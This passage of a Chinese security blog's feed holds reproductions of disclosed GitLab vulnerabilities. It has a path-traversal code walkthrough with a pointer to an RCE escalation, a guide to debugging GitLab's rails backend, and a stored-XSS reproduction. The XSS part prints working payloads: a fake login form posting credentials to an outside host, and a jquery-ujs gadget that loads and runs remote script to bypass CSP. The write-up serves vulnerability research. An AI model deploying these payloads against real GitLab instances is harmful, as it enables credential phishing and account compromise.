</code></pre></div>    </div>
    <p>其中super调用<em>/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/carrierwave-1.3.1/lib/carrierwave/storage/file.rb:53</em>，完成相对路径到绝对路径的转换:</p>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> def retrieve!(identifier)
     path = ::File.expand_path(uploader.store_path(identifier), uploader.root)
     CarrierWave::SanitizedFile.new(path)
 end
</code></pre></div>    </div>
    <p>见expand_path定义：</p>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> File.expand_path(relative_path, base_directory)
 File.expand_path is a Ruby method used to convert a relative file path to an absolute file path. 
 It takes a relative path as an argument and returns the corresponding absolute path.
</code></pre></div>    </div>
    <p>类继承关系:</p>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> FileUploader &lt; GitlabUploader &lt; CarrierWave::Uploader::Base
 FileUploader.retrieve_from_store! -&gt; CarrierWave.retrieve_from_store!
</code></pre></div>    </div>
    <p>GitlabUploader类对CarrierWave库进行封装，被用到多处文件操作中，查找漏洞需要重点关注该类。
 <em>lib/gitlab/gfm/uploads_rewriter.rb:51</em></p>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> def files
     referenced_files = @text.scan(@pattern).map do
         find_file(@source_project, $~[:secret], $~[:file])
     end

     referenced_files.compact.select(&amp;:exists?)
 end
</code></pre></div>    </div>
    <p>使用referenced_files.compact.select(&amp;:exists?)来判断文件是否存在，调用的是referenced_files中元素也就是FileUploader对象的exists方法：
 <em>app/uploaders/object_storage.rb:297</em></p>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> def exists?
     file.present?
 end
</code></pre></div>    </div>
  </li>
  <li>最后是文件拷贝
 <em>lib/gitlab/gfm/uploads_rewriter.rb:29</em>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> def rewrite(target_parent)
     return @text unless needs_rewrite?

     @text.gsub(@pattern) do |markdown|
         file = find_file(@source_project, $~[:secret], $~[:file])
         break markdown unless file.try(:exists?)

         klass = target_parent.is_a?(Namespace) ? NamespaceFileUploader : FileUploader
         moved = klass.copy_to(file, target_parent)

         moved_markdown = moved.markdown_link

         # Prevents rewrite of plain links as embedded
         if was_embedded?(markdown)
         moved_markdown
         else
         moved_markdown.sub(/\A!/, "")
         end
     end
 end
</code></pre></div>    </div>
    <p>其中copy_to方法将文件拷贝到目标路径：
 <em>app/uploaders/file_uploader.rb:166</em></p>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> def self.copy_to(uploader, to_project)
     moved = self.new(to_project)
     moved.object_store = uploader.object_store
     moved.filename = uploader.filename
    
     moved.copy_file(uploader.file)
     moved
 end
 def copy_file(file)
     to_path = if file_storage?
             File.join(self.class.root, store_path)
             else
             store_path
             end

     self.file = file.copy_to(to_path)
     record_upload # after_store is not triggered
 end
</code></pre></div>    </div>
    <p>最终使用carrierwave库的copy_to进行拷贝：
 <em>/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/carrierwave-1.3.1/lib/carrierwave/sanitized_file.rb</em>
 <em>def copy_to(new_path, permissions=nil, directory_permissions=nil)</em></p>
  </li>
  <li>升级为RCE，参考：<a href="https://gist.github.com/stonegao/4051110051622cc5d5cd30721b88f24e">https://gist.github.com/stonegao/4051110051622cc5d5cd30721b88f24e</a></li>
</ol>

<h2 id="tips">Tips</h2>

<p><strong>路径穿越漏洞</strong></p>
<ol>
  <li>上层，需要把每个功能点都考察一遍：
    <ul>
      <li>是否有移动行为，该移动行为是否涉及到File.join</li>
    </ul>
  </li>
  <li>底层，定位到功能点对应的代码：
    <ul>
      <li>File.join，是否可以控制join的某些变量，导致目录穿越问题。</li>
      <li>carrierwave的copy_to方法</li>
      <li>ruby File.expand_path方法相对路径转绝对路径</li>
    </ul>
  </li>
</ol>]]></content><author><name></name></author><category term="path-traversal" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Gitlab debugging: Using gitlab official docker to debug rails backend</title><link href="http://localhost:4000/debug/2023/12/30/using-gitlab-docker-to-debug.html" rel="alternate" type="text/html" title="Gitlab debugging: Using gitlab official docker to debug rails backend" /><published>2023-12-30T10:31:06+08:00</published><updated>2023-12-30T10:31:06+08:00</updated><id>http://localhost:4000/debug/2023/12/30/using-gitlab-docker-to-debug</id><content type="html" xml:base="http://localhost:4000/debug/2023/12/30/using-gitlab-docker-to-debug.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Using gitlab official docker to debug rails backend</p>
</blockquote>

<h2 id="environment">Environment</h2>

<ol>
  <li>
    <p><code class="language-plaintext highlighter-rouge">ps aux</code> 查看 gitlab 各种进程</p>

    <p><img src="/assets/gitlab/1/gitlabps.png" alt="gitlabps" /></p>
  </li>
  <li>
    <p>gitlab docker 的安装路径：<code class="language-plaintext highlighter-rouge">/opt/gitlab</code></p>
  </li>
  <li>
    <p>启动脚本：<code class="language-plaintext highlighter-rouge">/opt/gitlab/bin</code></p>
  </li>
  <li>
    <p>gitlab rails 目录：<code class="language-plaintext highlighter-rouge">/opt/gitlab/embedded/service/gitlab-rails</code></p>
  </li>
  <li>
    <p>gitlab rails 启动命令：<code class="language-plaintext highlighter-rouge">/opt/gitlab/bin/gitlab-rails</code>
<code class="language-plaintext highlighter-rouge">exec /opt/gitlab/embedded/bin/chpst -e /opt/gitlab/etc/gitlab-rails/env ${privilege_drop} -U ${gitlab_user}:${gitlab_group} /opt/gitlab/embedded/bin/bundle exec rails "$@"</code></p>
  </li>
  <li>
    <p>Docker gitlab 查看服务: <code class="language-plaintext highlighter-rouge">gitlab-ctl status</code></p>
  </li>
</ol>

<h2 id="steps">Steps</h2>

<ol>
  <li>
    <p>停止 <code class="language-plaintext highlighter-rouge">unicorn</code> 服务，该服务负责运行 rails，后续我们手动启动：</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gitlab-ctl stop unicorn
</code></pre></div>    </div>
  </li>
  <li>
    <p>端口占用：3000 被 grafana 占用，后续 rails 将启动在 3000 端口，需要将 grafana 停止：</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gitlab-ctl stop grafana
</code></pre></div>    </div>
  </li>
  <li>
    <p>手动启动 rails</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /opt/gitlab/bin &amp;&amp; ./gitlab-rails server
</code></pre></div>    </div>
  </li>
  <li>
    <p>修改 nginx 配置文件：<code class="language-plaintext highlighter-rouge">/var/opt/gitlab/nginx/conf/gitlab-http.conf</code> 。由于前端是编译好的，因此资源和 js 路径不再由 yarn 提供，而且由 nginx 提供，资源文件的重定向不变，但是位置需要提前。</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location /assets {
 proxy_cache gitlab;
 proxy_pass  http://gitlab-workhorse;
}
</code></pre></div>    </div>

    <p>其他所有流量重定向为 puma 开启的本地端口 3000</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location / {
   proxy_pass http://localhost:3000/;
   proxy_cache off;
}
</code></pre></div>    </div>

    <p>修改后重启 nginx：<code class="language-plaintext highlighter-rouge">gitlab-ctl restart nginx</code></p>
  </li>
  <li>
    <p>添加 ruby 的 include 文件夹，将 ruby 变为开发版本，否则无法安装 gem，gem 需要 native 依赖。编译相同版本的 ruby，将编译后的 include 文件夹拷贝到路径：<code class="language-plaintext highlighter-rouge">/opt/gitlab/embedded/</code></p>
  </li>
  <li>
    <p>进入 rails 目录<code class="language-plaintext highlighter-rouge">/opt/gitlab/embedded/service/gitlab-rails</code>，修改 Gemfile，添加 pry-byebug 库到主环境中，不加的话会报找不到 pry，例如</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gem 'pry-byebug', '~&gt; 3.5.1'
</code></pre></div>    </div>

    <p>同 development 环境的 version 一致</p>
  </li>
  <li>
    <p>然后在应用 root 目录执行 <code class="language-plaintext highlighter-rouge">bundle install</code>，自动安装 <code class="language-plaintext highlighter-rouge">pry-byebug</code></p>
  </li>
  <li>
    <p>在 break point 处下断点指令 <code class="language-plaintext highlighter-rouge">binding.pry</code></p>
  </li>
  <li>
    <p>启动后端，由 puma 启动，默认端口 3000：</p>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./gitlab-rails server -e development -b 0.0.0.0
</code></pre></div>    </div>
    <p>程序运行到断点会在当前终端停下</p>
  </li>
</ol>]]></content><author><name></name></author><category term="debug" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Reproduction: Gitlab Cross-site Scripting (XSS) - Stored in RDoc wiki pages</title><link href="http://localhost:4000/xss/2023/12/25/store-xss-in-rdocwiki.html" rel="alternate" type="text/html" title="Reproduction: Gitlab Cross-site Scripting (XSS) - Stored in RDoc wiki pages" /><published>2023-12-25T10:31:06+08:00</published><updated>2023-12-25T10:31:06+08:00</updated><id>http://localhost:4000/xss/2023/12/25/store-xss-in-rdocwiki</id><content type="html" xml:base="http://localhost:4000/xss/2023/12/25/store-xss-in-rdocwiki.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Gitlab Cross-site Scripting (XSS) - Stored in RDoc wiki pages</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>XSS</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>高危</p>
</blockquote>

<h2 id="environment">Environment</h2>

<blockquote>
  <p>Ubuntu 18.04
gitlab 12.3.5</p>
</blockquote>

<blockquote>
  <p>原文：<a href="https://hackerone.com/reports/662287">https://hackerone.com/reports/662287</a></p>
</blockquote>

<h2 id="url">URL</h2>

<h2 id="summary">Summary</h2>

<p>该漏洞存在于用 md 构建 wikipage 这一过程，由于后端没有对 rdoc(和 markdown 很像，ruby 文档生成器)进行严格处理，导致用户能够注入大量 html 代码，这个漏洞太经典了，后续很多漏洞都是以此为基础而利用。</p>

<p><img src="/assets/gitlab/1/rdoc.png" alt="rdoc" /></p>

<p>报告过程</p>

<ol>
  <li>2019 年 7 月 28 日，首先找到 rdoc 渲染问题，用户能够将 image 嵌入到 a 标签中，并且能够注入 class 属性。</li>
  <li>注入的 class 属性利用了原应用的类，将 a 标签 z-index 置顶，诱导用户点击。</li>
  <li>用户甚至能够注入 html 代码，构造钓鱼弹框。但是还没涉及到 xss。（以上是 ruby 后端渲染漏洞）</li>
  <li>攻击者发现可以注入特定类的 html 代码，拼接前端的 jquery 代码，实现 xss 注入。该处还未实现 csp 绕过。</li>
  <li>2 个月后，2019 年 10 月 13 日，该漏洞还未修复。并且 gitlab 引用了新的漏洞代码 jquery-ujs，利用 data-method 属性，实现 csp 绕过。（以上是前端漏洞）</li>
  <li>总结下来，该漏洞分为三部分，第一部分是 html 注入，第二部分是 xss 注入，第三部分是 csp 绕过。</li>
  <li>因此，复现以最新版本进行，2019 年 10 月 13 日发布的 gitlab12.3.5。</li>
</ol>

<p>要点：</p>

<ol>
  <li>class 注入，改变元素外观，从而触发点击</li>
  <li>a 标签包围 img 标签，img 设置为无限大，触发点击</li>
  <li>jquery-ujs 的 data-method
jquery-ujs 提供了一些额外的特性，如将 data-remote 属性应用到链接和表单上，然后使用 AJAX 请求提交数据，或者利用 data-confirm 属性显示确认对话框。</li>
</ol>

<h3 id="backend-rails">backend, rails</h3>

<p>payload</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a form
{
&lt;div class="modal show d-block"&gt;
&lt;div class="modal-dialog"&gt;
&lt;div class="modal-content"&gt;
&lt;div class="modal-header"&gt;
&lt;h3 class="page-title"&gt;Please Log In&lt;/h3&gt;
&lt;/div&gt;
&lt;div class="modal-body"&gt;
&lt;form class="new-wiki-page" action="http://aw.rs/"&gt;
&lt;div class="form-group"&gt;
&lt;label for="username"&gt;&lt;span&gt;Username&lt;/span&gt;&lt;/label&gt;
&lt;input type="text" name="username" id="username" class="form-control"&gt;
&lt;label for="password"&gt;&lt;span&gt;Password&lt;/span&gt;&lt;/label&gt;
&lt;input type="password" name="password" id="password" class="form-control"&gt;
&lt;/div&gt;
&lt;div class="form-actions"&gt;&lt;button name="button" type="submit" class="btn btn-success"&gt;Login&lt;/button&gt;&lt;/div&gt;
&lt;/form&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
}[/]
</code></pre></div></div>

<p>可以看到能够注入 <code class="language-plaintext highlighter-rouge">div、h3、form、label、input</code> 等标签，以及 <code class="language-plaintext highlighter-rouge">class、action、id、type</code> 等属性。 后端渲染时可以注入部分标签、class 和部分属性，但是 data 属性无法注入，应该是后端做了过滤。因此才会利用前端 gadget 来注入新的包含 <code class="language-plaintext highlighter-rouge">data-*</code>属性的 a 标签，因此该攻击的本质是，首先通过后端注入有限的 html，然后再通过前端 gadget 来注入无限的 html。
提交该数据的 url 为 post 方法：<em>http://10.206.44.19:8033/root/xss/wikis</em></p>

<h3 id="frontend-jquery-gadgets">frontend, jquery gadgets</h3>

<p>需要点击触发 jquery-ujs 的 data-method 方法，也就是说只要网站支持 jqeury-ujs，并且能够注入 a 标签及其属性，那么 xss 必然出现</p>

<p>payload1:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
&lt;form class="gl-show-field-errors"&gt;
&lt;input type="text" title="&amp;#x3C;/p&amp;#x3E;&amp;#x3C;a data-remote=&amp;#x22;true&amp;#x22; data-confirm=&amp;#x22;Are you sure&amp;#x22; data-method=&amp;#x22;get&amp;#x22; data-type=&amp;#x22;script&amp;#x22; href=&amp;#x22;https://gitlab.com/vakzz-h1/public/-/raw/master/test.js&amp;#x22; class=&amp;#x27;atwho-view select2-drop-mask pika-select&amp;#x27;&amp;#x3E;&amp;#x3C;img height=10000 width=10000&amp;#x3E;&amp;#x3C;/a&amp;#x3E;"&gt;
}[#]
</code></pre></div></div>

<p>后端渲染结果：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;form class="xxx"&gt;&lt;input type="" title="xxx"&gt;
</code></pre></div></div>

<p>前端渲染后：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;form&gt;&lt;a data-method='get'&gt;&lt;img&gt;&lt;/a&gt;&lt;/form&gt;
</code></pre></div></div>

<p>经过测试 jquery-ujs 会直接执行 script，如下面代码片段，在最新版本上测试可以 xss：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-ujs/1.2.3/rails.js"&gt;&lt;/script&gt;
&lt;a data-remote="true" data-confirm="Are you sure" data-method="get" data-type="script"
        href="https://gitlab.com/vakzz-h1/public/-/raw/master/test.js"&gt;
        jquery-ujs xss test
&lt;/a&gt;
</code></pre></div></div>

<p>其中 data-type 对应 ajax 的 type 字段，参考</p>

<ul>
  <li><a href="https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-type">https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-type</a></li>
  <li><a href="https://api.jquery.com/jQuery.ajax/">https://api.jquery.com/jQuery.ajax/</a></li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dataType (default: Intelligent Guess (xml, json, script, or html))
"script": Evaluates the response as JavaScript and returns it as plain text. Disables caching by appending a query string parameter, _=[TIMESTAMP], to the URL unless the cache option is set to true. Note: This will turn POSTs into GETs for remote-domain requests. an XML MIME type will yield XML, in 1.4 JSON will yield a JavaScript object, in 1.4 script will execute the script, and anything else will be returned as a string
</code></pre></div></div>

<p>例如在 chrome-tools control+p 搜索：jquery-ujs 关键字，看目标网站是否有该库</p>

<p><img src="/assets/gitlab/1/ujs.png" alt="ujs" /></p>

<p>payload2:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
&lt;form class="gl-show-field-errors"&gt;
&lt;input type="text" title="&lt;script&gt;alert(11)&lt;/script&gt;"&gt;
}[#]
</code></pre></div></div>

<p>从下一个复现漏洞中得知利用前端 jquery 片段的漏洞，由于该漏洞需要在页面初始化时才会调用，而本次复现，后端渲染的漏洞代码直接通过路由页面返回。因此 main.js 得以执行触发该漏洞。</p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>